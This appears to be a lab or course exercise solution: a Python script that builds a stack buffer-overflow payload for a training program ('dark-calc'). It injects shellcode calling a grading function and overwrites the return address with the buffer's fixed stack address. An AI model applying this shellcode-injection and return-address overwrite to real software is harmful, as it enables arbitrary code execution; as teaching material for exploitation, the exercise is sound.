#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

The program runs on a fixed, RWX stack whose top is 0x721000801000.
Walking the frames (__wrap_main -> main -> input) puts input's
expression buffer at 0x721000800fd0.

Inject shellcode at the start of the buffer:
    mov edi, 4            ; first argument of grade_eval
    mov eax, 0x401a87     ; address of grade_eval
    call rax              ; grade_eval(4) prints "Hope A will be your grade!"
then pad to the return address and redirect it to the shellcode.
"""
import struct
import sys

SHELLCODE_ADDR = 0x721000800FD0
GRADE_EVAL = 0x401A87

shellcode = b"\xbf\x04\x00\x00\x00"          # mov edi, 4
shellcode += b"\xb8" + struct.pack("<I", GRADE_EVAL)  # mov eax, grade_eval
shellcode += b"\xff\xd0"                     # call rax

payload = shellcode
payload += b"A" * (24 - len(payload))
payload += struct.pack("<Q", SHELLCODE_ADDR)
payload += b"\n"

sys.stdout.buffer.write(payload)
